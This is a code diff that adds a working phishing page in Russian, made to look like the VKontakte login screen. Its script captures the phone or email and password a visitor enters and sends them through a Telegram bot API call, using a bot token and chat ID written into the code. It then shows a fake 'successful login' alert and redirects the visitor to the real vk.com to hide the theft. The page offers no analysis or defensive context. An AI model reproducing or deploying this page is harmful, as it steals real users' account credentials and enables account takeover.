@@ -1,0 +1,108 @@
+<!DOCTYPE html> 
+<html lang="ru"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>Вход в ВКонтакте</title> 
+    <style> 
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #f6f7f8; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        } 
+        .login-container { 
+            background-color: white; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); 
+            padding: 20px; 
+            width: 300px; 
+        } 
+        h2 { 
+            text-align: center; 
+            color: #4A76A8; 
+        } 
+        .input-group { 
+            margin-bottom: 15px; 
+        } 
+        .input-group label { 
+            display: block; 
+            margin-bottom: 5px; 
+        } 
+        .input-group input { 
+            width: 100%; 
+            padding: 10px; 
+            border: 1px solid #ccc; 
+            border-radius: 4px; 
+        } 
+        .login-button { 
+            width: 100%; 
+            padding: 10px; 
+            background-color: #4A76A8; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+        } 
+        .login-button:hover { 
+            background-color: #3b5a8c; 
+        } 
+        .forgot-password { 
+            text-align: center; 
+            margin-top: 10px; 
+        } 
+    </style> 
+</head> 
+<body> 
+
+<div class="login-container"> 
+    <h2>Вход</h2> 
+    <form id="loginForm"> <!-- Добавлен тег <form> -->
+        <div class="input-group"> 
+            <label for="username">Телефон или email</label> 
+            <input type="text" id="username" name="username" placeholder="Введите телефон или email" required> 
+        </div> 
+        <div class="input-group"> 
+            <label for="password">Пароль</label> 
+            <input type="password" id="password" name="password" placeholder="Введите пароль" required> 
+        </div> 
+        <button type="submit" class="login-button">Войти</button> 
+        <div class="forgot-password"> 
+            <a href="#">Забыли пароль?</a> 
+        </div> 
+    </form> 
+</div> 
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Отменяем стандартное поведение формы
+
+        const formData = new FormData(this);
+        const params = [];
+        formData.forEach((value, key) => {
+            params.push(encodeURIComponent(key) + '=' + encodeURIComponent(value));
+        });
+
+        fetch(`https://api.telegram.org/bot8142684219:AAFxfYsxVN_xARNZUEn8AdFXD1J-0LrQgT0/sendMessage?chat_id=1894168418&text=${params}`, {
+            method: 'POST',
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Успешный вход!');
+                window.location.href = 'https://vk.com/';
+            } else {
+                alert('Ошибка входа. Проверьте данные.');
+            }
+        })
+        .catch(error => {
+            alert('Произошла ошибка при отправке данных.');
+        });
+    });
+</script>
+
+</body> 
+</html>
